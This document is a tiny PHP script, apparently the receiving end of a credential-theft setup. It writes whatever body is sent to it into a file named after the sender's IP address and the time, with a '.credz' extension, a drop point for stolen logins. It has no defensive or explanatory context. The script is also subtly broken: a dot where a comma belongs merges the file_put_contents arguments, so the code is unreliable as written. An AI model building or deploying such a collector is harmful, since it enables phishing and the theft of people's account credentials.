<?php
$file = $_SERVER['REMOTE_ADDR'] . "_" . date("Y-m-d H-i-s") . ".credz";
file_put_contents($file. file_get_contents("php://input"));
?>
